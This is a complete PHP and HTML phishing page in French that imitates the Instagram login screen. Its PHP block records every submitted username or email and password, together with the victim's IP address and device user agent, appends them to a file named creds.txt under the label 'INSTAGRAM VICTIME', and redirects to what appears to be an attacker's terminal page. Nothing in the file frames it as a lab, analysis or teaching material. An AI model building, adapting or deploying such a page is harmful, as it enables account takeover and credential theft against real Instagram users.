<?php
if ($_POST) {
    // IP réelle
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']
        ?? $_SERVER['HTTP_X_REAL_IP']
        ?? $_SERVER['REMOTE_ADDR']
        ?? 'inconnue';
    $ip = trim(explode(',', $ip)[0]);

    $email = $_POST['email'] ?? '';
    $pass  = $_POST['password'] ?? '';
    $ua    = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 150);
    $time  = date('Y-m-d H:i:s');

    // Format pour Instagram
    $log  = "┌─────────────────────────────────────────\n";
    $log .= "│ 🎯 INSTAGRAM VICTIME — {$time}\n";
    $log .= "├─────────────────────────────────────────\n";
    $log .= "│ 📧 EMAIL/USER : {$email}\n";
    $log .= "│ 🔑 MOT DE PASSE : {$pass}\n";
    $log .= "│ 🌐 ADRESSE IP   : {$ip}\n";
    $log .= "│ 📱 APPAREIL     : {$ua}\n";
    $log .= "└─────────────────────────────────────────\n";

    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    header('Location: terminal.php?newhit=1');
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Instagram - Connexion</title>
    <style>
        body {
            background: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            text-align: center;
            width: 350px;
        }
        .logo {
            font-family: 'Grand Hotel', cursive;
            font-size: 40px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            box-sizing: border-box;
        }
        button {
            background: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            width: 100%;
            font-weight: bold;
            cursor: pointer;
        }
        .forgot {
            margin-top: 20px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <form method="POST" action="instagramlogin.php">
            <input type="text" name="email" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>
        <div class="forgot">
            <a href="#">Mot de passe oublié ?</a>
        </div>
    </div>
</body>
</html>
